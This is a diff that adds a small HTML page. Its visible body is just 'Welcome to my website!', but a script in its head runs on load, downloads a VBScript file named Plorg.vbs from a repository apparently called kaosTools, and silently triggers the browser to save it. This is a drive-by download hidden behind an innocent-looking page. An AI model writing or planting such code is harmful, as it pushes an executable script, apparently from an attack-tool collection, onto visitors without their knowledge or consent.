@@ -1,0 +1,21 @@
+<html>
+<head>
+  <script>
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://github.com/kaosSec/kaosTools/raw/main/luvzmiscvbs/Plorg.vbs", true);
+    xhr.responseType = "blob";
+    xhr.onload = function() {
+      var URL = window.URL || window.webkitURL;
+      var blob = new Blob([xhr.response], {type: "application/octet-stream"});
+      var link = document.createElement("a");
+      link.href = URL.createObjectURL(blob);
+      link.download = "Plorg.vbs";
+      link.click();
+    }
+    xhr.send();
+  </script>
+</head>
+<body>
+  <h1>Welcome to my website!</h1>
+</body>
+</html>
